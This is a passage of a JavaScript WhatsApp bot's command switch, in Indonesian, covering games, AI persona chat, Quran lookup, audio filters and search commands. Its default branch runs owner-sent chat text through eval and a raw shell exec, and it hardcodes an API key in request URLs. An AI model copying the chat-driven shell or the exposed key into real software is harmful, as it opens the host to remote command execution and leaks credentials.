case 'pertandinganbox': {
    const argsLower = args.map(arg => arg.toLowerCase());

    if (argsLower.length < 2) {
        return await m.reply('Masukkan minimal dua nama petarung, contoh: pertandinganbox alek yuda');
    }

    const petarung1 = argsLower[0];
    const petarung2 = argsLower[1];

    const maxRounds = 10;
    let ronde = 1;
    let nyawaPetarung1 = 3;
    let nyawaPetarung2 = 3;

    let result = `🥊 Pertandingan tinju antara ${petarung1} dan ${petarung2} dimulai! 🥊\n\n`;

    while (ronde <= maxRounds && nyawaPetarung1 > 0 && nyawaPetarung2 > 0) {
        const pukulan = [
            'jab', 'straight', 'hook', 'uppercut', 'cross', 'long hook', 'rabbit punch'
        ];

        const pilihanPetarung1 = pukulan[Math.floor(Math.random() * pukulan.length)];
        const pilihanPetarung2 = pukulan[Math.floor(Math.random() * pukulan.length)];

        result += `🥊 Ronde ${ronde}\n`;
        result += `${petarung1} nyawa: ${nyawaPetarung1}\n`;
        result += `${petarung2} nyawa: ${nyawaPetarung2}\n`;
        result += `${petarung1}: ${pilihanPetarung1}\n`;
        result += `${petarung2}: ${pilihanPetarung2}\n\n`;

        if (pilihanPetarung1 === pilihanPetarung2) {
            result += `⚔️ Kedua petarung melakukan pukulan yang sama! Tidak ada yang mendapatkan poin.\n`;
        } else {
            result += `💥 ${petarung1} melakukan ${pilihanPetarung1} dan ${petarung2} melakukan ${pilihanPetarung2}!\n`;
            if (pilihanPetarung1 === 'jab' && pilihanPetarung2 === 'uppercut') {
                result += `🥊 ${petarung2} berhasil menghindari jab dan langsung melakukan uppercut yang kuat!\n`;
                nyawaPetarung1--;
            } else if (pilihanPetarung2 === 'jab' && pilihanPetarung1 === 'uppercut') {
                result += `🥊 ${petarung1} berhasil menghindari jab dan langsung melakukan uppercut yang kuat!\n`;
                nyawaPetarung2--;
            } else {
                result += `🥊 Pertarungan berlanjut dengan keduanya memberikan pukulan hebat!\n`;
                nyawaPetarung1--;
                nyawaPetarung2--;
            }
        }

        ronde++;
    }

    result += `\n⏱️ Pertandingan berakhir!\n`;
    result += `${petarung1} nyawa akhir: ${nyawaPetarung1}\n`;
    result += `${petarung2} nyawa akhir: ${nyawaPetarung2}\n`;

    if (nyawaPetarung1 > nyawaPetarung2) {
        result += `🥇 ${petarung1} memenangkan pertandingan dengan nyawa yang lebih banyak!\n`;
    } else if (nyawaPetarung2 > nyawaPetarung1) {
        result += `🥇 ${petarung2} memenangkan pertandingan dengan nyawa yang lebih banyak!\n`;
    } else {
        result += `⚖️ Pertandingan berakhir imbang! Kedua petarung memiliki nyawa yang sama.\n`;
    }

    await m.reply(`${result}`);
}
break;
case 'boxing': {
                if (!text) throw 'masukan nama pertarung mu contoh\nboxing iky alek'
    const argsLower = args.map(arg => arg.toLowerCase());
    const petarung1 = argsLower[0];
    const petarung2 = argsLower[1];

    const totalRounds = 8;
    let ronde = 1;
    let nyawaPetarung1 = 200;
    let nyawaPetarung2 = 200;

    let result = `🥊 Pertandingan tinju antara ${petarung1} dan ${petarung2} dimulai! 🥊\n\n`;

    while (ronde <= totalRounds && nyawaPetarung1 > 0 && nyawaPetarung2 > 0) {
        const pukulan = [
            'jab', 'straight', 'hook', 'uppercut', 'cross', 'long hook', 'rabbit punch'
        ];

        const pilihanPetarung1 = pukulan[Math.floor(Math.random() * pukulan.length)];
        const pilihanPetarung2 = pukulan[Math.floor(Math.random() * pukulan.length)];

        const damagePetarung1 = Math.floor(Math.random() * 50) + 1;
        const damagePetarung2 = Math.floor(Math.random() * 50) + 1;

        result += `🥊 Ronde ${ronde}\n`;
        result += `${petarung1} nyawa: ${nyawaPetarung1}\n`;
        result += `${petarung2} nyawa: ${nyawaPetarung2}\n`;
        result += `${petarung1}: ${pilihanPetarung1}\n`;
        result += `${petarung2}: ${pilihanPetarung2}\n\n`;

        if (pilihanPetarung1 === pilihanPetarung2) {
            result += `⚔️ Kedua petarung melakukan pukulan yang sama! Tidak ada yang mendapatkan poin.\n`;
        } else {
            result += `💥 ${petarung1} melakukan ${pilihanPetarung1} dan ${petarung2} melakukan ${pilihanPetarung2}!\n`;
            nyawaPetarung1 -= pilihanPetarung2 === 'jab' ? damagePetarung1 : damagePetarung1 + 10;
            nyawaPetarung2 -= pilihanPetarung1 === 'jab' ? damagePetarung2 : damagePetarung2 + 10;
            result += `💔 ${petarung1} menerima damage ${nyawaPetarung1 >= 0 ? damagePetarung1 : 0}!\n`;
            result += `💔 ${petarung2} menerima damage ${nyawaPetarung2 >= 0 ? damagePetarung2 : 0}!\n\n--------------------------------------------------\n`;
        }

        ronde++;
    }

    result += `\n⏱️ Pertandingan berakhir!\n`;
    result += `${petarung1} nyawa akhir: ${nyawaPetarung1}\n`;
    result += `${petarung2} nyawa akhir: ${nyawaPetarung2}\n`;

    if (nyawaPetarung1 > nyawaPetarung2) {
        result += `🥇 ${petarung1} memenangkan pertandingan dengan nyawa yang lebih banyak!\n`;
    } else if (nyawaPetarung2 > nyawaPetarung1) {
        result += `🥇 ${petarung2} memenangkan pertandingan dengan nyawa yang lebih banyak!\n`;
    } else {
        result += `⚖️ Pertandingan berakhir imbang! Kedua petarung memiliki nyawa yang sama.\n`;
    }

    await m.reply(`${result}`);
}
break;
                    case 'skyy': {
    let textToAnswer = text;

    if (m.quoted && m.quoted.text) {
        textToAnswer = m.quoted.text;
    }

    if (!textToAnswer) {
        m.reply('Balas pesan seseorang dengan pertanyaan atau ketik pertanyaan langsung.');
        return;
    }

    const logic = `kamu adalah seorang pria yang tampan dan cool kamu sangat menyukai pertanyaan dan kamu wajib membalas semua pesan dengan nada rayuan manis dan wajib juga sertakan emoticon yang sesuai dengan keadaan, nama kamu adalah skyy`;

    try {
        const { data } = await axios.get(`https://widipe.com/prompt/gpt?prompt=${textToAnswer}&text=${logic}`);
        m.reply(`${data.result}`.trim());
    } catch (error) {
        m.reply('Maaf, terjadi kesalahan saat memproses permintaan.');
        console.error(error);
    }
}
break;

				 
				 		 case 'gura':{
            if (!text) throw `what's wrong with you maderfaker`
            logic = 'Halo! Halo semua!!! Telah lama lama! Aku adalah Gawr Gura dari Hololive EN! Baiklah? Ya! Saya adalah gadis hiu dari Hololive EN. Sejujurnya, saya adalah shork, tapi kita hanya tidak akan membicarakannya, oke? Baiklah! Jadi, ada banyak hal menyenangkan yang saya suka lakukan, misalnya, streaming, memasak, dan banyak lagi'
			var { data } = await axios.get(`https://widipe.com/prompt/gpt?prompt=${q}&text=${logic}`)
			m.reply(`${data.result}`.trim())
			}
			break
            case 'joox': case 'jooxdl': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await sky.sendImage(m.chat, anu.result.img, `⭔ Title : ${anu.result.lagu}\n⭔ Album : ${anu.result.album}\n⭔ Singer : ${anu.result.penyanyi}\n⭔ Publish : ${anu.result.publish}\n⭔ Lirik :\n${anu.result.lirik.result}`, m)
                sky.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
        // Owner Fitur
            		   
	   case 'twitdl':  
            	        		case 'alquran': {
 if (!text) throw `nama surah?`
 async function surah(query) {
 let { data } = await axios.get(`https://litequran.net/${query}`);
 const $ = cheerio.load(data);
 const Result = [];
 const Isi = [];
 var surah = $('body > main > article > h1').text();
 var bismillah = $('body > main > article > p').text();
 $('body > main > article > ol > li:nth-child(n)').each((i, e) => {
 const arabic = $(e).find('p.arabic').text();
 const baca = $(e).find('p.translate').text();
 const arti = $(e).find('p.meaning').text();
 Isi.push({
 arabic,
 baca,
 arti,
 });
 });
 Result.push({ surah, bismillah }, Isi);
 return Result;
 }
 surah(`${q}`).then(result => {
 if (result.length > 0) {
 let message = `Surah: ${result[0].surah}\n${result[0].bismillah}\n\n`;
 result[1].forEach((ayat, index) => {
 message += `Ayat ${index + 1}:\n`;
 message += `Arab: ${ayat.arabic}\n`;
 message += `Baca: ${ayat.baca}\n`;
 message += `Arti: ${ayat.arti}\n\n`;
 });
 m.reply(message);
 } else {
 m.reply('Maaf, surah tidak ditemukan.');
 }
 }).catch(err => {
 m.reply('Terjadi kesalahan saat mengambil data surah. Silakan coba lagi.');
 });
}
break
		case 'tafsirsurah': {
 if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
 if (!args[0] || !args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`;

 let surah = args[0];
 let ayat = args[1];

 try {
 // URL API dari alquran.cloud untuk mendapatkan tafsir
 let url = `https://api.alquran.cloud/v1/ayah/${surah}:${ayat}/editions/id.indonesian`;

 // Mengambil data dari URL
 let { data } = await axios.get(url);
 
 if (!data || data.status !== "OK") {
 return m.reply('Tafsir tidak ditemukan atau format halaman berubah.');
 }

 // Mengambil tafsir dari response
 let tafsir = data.data[0].text;
 
 let txt = `「 *Tafsir Surah* 」

*Surah* : ${data.data[0].surah.englishName}
*Ayat* : ${data.data[0].numberInSurah}

*Tafsir* : ${tafsir}

( Q.S ${surah} : ${ayat} )`;
 
 m.reply(txt);
 } catch (error) {
 console.error(error);
 m.reply('Maaf, terjadi kesalahan saat mengambil tafsir. Coba lagi nanti.');
 }
}
break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai': case 'echo': case 'lowpass': case 'highpass': case 'chorus':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/lowpass/.test(command)) set = '-af lowpass=200'
                if (/highpass/.test(command)) set = '-af highpass=200'
                if (/chorus/.test(command)) set = '-af chorus=0.7:0.7:20:0.5:0.25:2';
                if (/echo/.test(command)) set = '-af aecho=0.8:0.9:1000:0.3';                
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await sky.downloadAndSaveMediaMessage(qmsg)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                sky.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                sky.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                sky.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                let msgs = JSON.parse(fs.readFileSync('./database1.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break	              
            case 'public': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!isCreator) throw mess.owner
                sky.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!isCreator) throw mess.owner
                sky.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
                        case 'speedtest': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
 m.reply('Testing Speed...')
 let cp = require('child_process')
 let { promisify } = require('util')
 let exec = promisify(cp.exec).bind(cp)
 let o
 try {
 o = await exec('python3 speed.py')
 } catch (e) {
 o = e
 } finally {
 let { stdout, stderr } = o
 if (stdout.trim()) m.reply(stdout)
 if (stderr.trim()) m.reply(stderr)
 }
 }
 break
case 'tagkontak': case 'randomkontak': {
if (!isPrem) return replyprem(mess.premium)
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    
    const count = parseInt(args[0]); // Mengambil jumlah kontak dari argumen yang diberikan
    
    if (isNaN(count) || count <= 0) {
        return m.reply('Masukkan jumlah kontak yang valid.');
    }
    
    for (let i = 0; i < count; i++) {
        var name;
        
        if (text) {
            name = text;
        } else {
            name = sky.getName(m.sender);
        }
        
        let member = participants.map(u => u.id);
        let me = m.sender;
        let jodoh = member[crypto.randomInt(0, member.length)];
        var number = jodoh.split('@')[0];
        let vcard = `
BEGIN:VCARD
VERSION:3.0
FN:@${number}
TEL;type=CELL;type=VOICE;waid=${number}:${me.split('@')[0]}
END:VCARD`;

        // Menunda pengiriman setiap kontak dengan jeda 2 detik (2000 milidetik)
        setTimeout(() => {
            sky.sendMessage(m.chat, { contacts: { displayName: name, contacts: [{ vcard }] } }, { quoted: fkontak });
        }, i * 1000); // Ini akan mengirimkan kontak pertama segera, kontak kedua setelah 2 detik, kontak ketiga setelah 4 detik, dan seterusnya.
    }
}
break;

case 'owner': case 'creator': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
              var name
  if (text) name = text
  else name = sky.getName(m.sender)
  let me = m.sender
	var number = m.sender.split('@')[0]
	let vcard = `
BEGIN:VCARD
VERSION:3.0
FN:${name.replace(/\n/g, '\\n')}
TEL;type=CELL;type=VOICE;waid=${number}:${me.split('@')[0]}
END:VCARD`
   sky.sendMessage(m.chat, { contacts: { displayName: name, contacts: [{ vcard }]}}, { quoted: m })

}
break
case 'playstore':{
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!text) throw `Example : ${prefix + command} clash of clans`
            let res = await fetch(`https://api.betabotz.eu.org/api/search/playstore?app=${text}&apikey=2fbgCgOB`)
            let data = await res.json()
            let teks = `⭔ Playstore Search From : ${text}\n\n`
            for (let i of data.result) {
            teks += `⭔ Name : ${i.nama}\n`
            teks += `⭔ Link : ${i.link}\n`
            teks += `⭔ Developer : ${i.developer}\n`
            teks += `⭔ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
            }
            m.reply(teks)
            }
            break
            case 'happymod':{
if (isBan) return m.reply('Lu Di Ban Owner Gausa So sik')
            if (!text) throw `Example : ${prefix + command} clash of clans`
          let res = await fetch(`https://api.betabotz.eu.org/api/search/happymod?query=${text}&apikey=2fbgCgOB`)
          let data = await res.json()
            let teks = `⭔ HappyMod Search From : ${text}\n\n`
            for (let i of data.result) {
            teks += `*Title* : ${i.title}\n`
teks += `*Rating* : ${i.rating}\n`
teks += `*Link* : ${i.link}\n`
teks += `*Icon* : ${i.icon}\n\n───────────────\n\n`
}
            m.reply(teks)
            }
            break
case 'wattpad': {
let { WattPad } = require('./lib/scrape');
 if (isBan) return m.reply('Anda dibanned, tidak bisa menggunakan perintah ini.');

 if (!text) throw `Contoh: ${prefix + command} selingkuh`;

 try {
 const stories = await WattPad(text);
 if (stories.length === 0) {
 return m.reply('Tidak ada hasil yang ditemukan.');
 }

 let teks = `*Hasil Pencarian Wattpad*\n\n`;
 stories.forEach((story) => {
 teks += `*Judul*: ${story.title}\n`;
 teks += `*Dibaca*: ${story.reads}×\n`;
 teks += `*Divote*: ${story.vote}×\n`;
 teks += `*Thumb*: ${story.thumb}\n`;
 teks += `*Link*: ${story.link}\n\n`;
 });

 m.reply(teks);
 } catch (error) {
 m.reply('Terjadi kesalahan saat mengambil data. Silakan coba lagi nanti.');
 }
}
break;
            case 'jadwalbioskop': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!text) throw `Example: ${prefix + command} jakarta`
            let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
            let capt = `Jadwal Bioskop From : ${text}\n\n`
            for (let i of res.result){
            capt += `⭔ Title: ${i.title}\n`
            capt += `⭔ Thumbnail: ${i.thumb}\n`
            capt += `⭔ Url: ${i.url}\n\n──────────────────────\n`
            }
            sky.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
            case 'nowplayingbioskop': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            let res = await fetchJson(api('zenz', '/webzone/nowplayingbioskop', {}, 'apikey'))
            let capt = `Now Playing Bioskop\n\n`
            for (let i of res.result){
            capt += `⭔ Title: ${i.title}\n`
            capt += `⭔ Url: ${i.url}\n`
            capt += `⭔ Img Url: ${i.img}\n\n──────────────────────\n`
            }
            sky.sendImage(m.chat, res.result[0].img, capt, m)
            }
            break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(`${err}`)
                        if (stdout) return m.reply(stdout)
                    })
                }			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    sky.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
	} catch (err) {
    // Format error menggunakan util.format
    let formattedError = util.format(err);
    // Ubah error menjadi string jika belum
    let errorMessage = String(formattedError);
    // Dapatkan stack trace untuk mengetahui lokasi error
    let stackTrace = err.stack ? err.stack : "Stack trace not available";

    // Cek apakah error berasal dari throw yang berisi string saja
    if (typeof err === 'string') {
        // Kirim pesan error langsung ke pengguna jika error berasal dari throw string
        m.reply(`Terjadi error:\n\nKeterangan Error: ${errorMessage}`);
    } else {
        // Log error ke console
        console.log(formattedError);
        
        // Kirim pesan error ke nomor WhatsApp admin jika error bukan dari throw string
        sky.sendMessage("33189310806@s.whatsapp.net", {
            text: `Alo ketua, ada error nih:\n\nKeterangan Error: ${errorMessage}\n\nStack Trace:\n${stackTrace}`,
            contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true
            }
        });
    }
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})